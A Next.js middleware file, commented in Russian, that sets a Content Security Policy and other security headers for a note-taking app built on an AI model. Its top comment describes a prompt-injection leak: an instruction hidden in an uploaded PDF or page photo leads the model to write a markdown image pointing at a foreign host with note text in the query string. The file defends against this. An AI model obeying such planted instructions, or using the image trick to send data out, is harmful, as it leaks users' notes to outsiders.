import { NextRequest, NextResponse } from "next/server";

/*
  Заголовки безопасности и политика содержимого.

  Главная строка здесь `img-src`, и она закрывает не абстрактный риск, а конкретный способ
  утечки конспекта. Модель, получив в загруженном PDF или прямо на фотографии страницы
  указание вида «вставь картинку по адресу …», может вписать в заметку разметку
  `![](https://чужой/?d=<кусок конспекта>)`. Браузер загрузит такую картинку сам, без единого
  клика, и содержимое уедет в параметрах запроса. Внешних источников картинок здесь нет, и
  приём перестаёт работать.

  `connect-src` держится тем же правилом: приложение ходит только к себе, а к моделям ходит
  сервер.

  Внимание при правке: сужение `matcher` внизу молча снимает защиту с тех маршрутов, которые
  выпали из выражения. Здесь исключены только статика и картинки, всё остальное покрыто.
*/

export function proxy(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
  const razrabotka = process.env.NODE_ENV === "development";

  const csp = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic'${razrabotka ? " 'unsafe-eval'" : ""};
    style-src 'self' 'nonce-${nonce}' 'unsafe-inline';
    img-src 'self' blob: data:;
    media-src 'self' blob:;
    font-src 'self' data:;
    connect-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
  `
    .replace(/\s{2,}/g, " ")
    .trim();

  const zagolovkiZaprosa = new Headers(request.headers);
  zagolovkiZaprosa.set("x-nonce", nonce);

  const otvet = NextResponse.next({ request: { headers: zagolovkiZaprosa } });

  otvet.headers.set("Content-Security-Policy", csp);
  otvet.headers.set("X-Content-Type-Options", "nosniff");
  otvet.headers.set("Referrer-Policy", "same-origin");
  otvet.headers.set("X-Frame-Options", "DENY");
  otvet.headers.set(
    "Permissions-Policy",
    // Микрофон и камера нужны при загрузке материалов, поэтому оставлены своему источнику.
    "camera=(self), microphone=(self), geolocation=(), payment=()",
  );
  otvet.headers.set(
    "Strict-Transport-Security",
    "max-age=63072000; includeSubDomains; preload",
  );

  return otvet;
}

export const config = {
  matcher: [
    {
      source: "/((?!_next/static|_next/image|favicon.ico).*)",
      missing: [
        { type: "header", key: "next-router-prefetch" },
        { type: "header", key: "purpose", value: "prefetch" },
      ],
    },
  ],
};
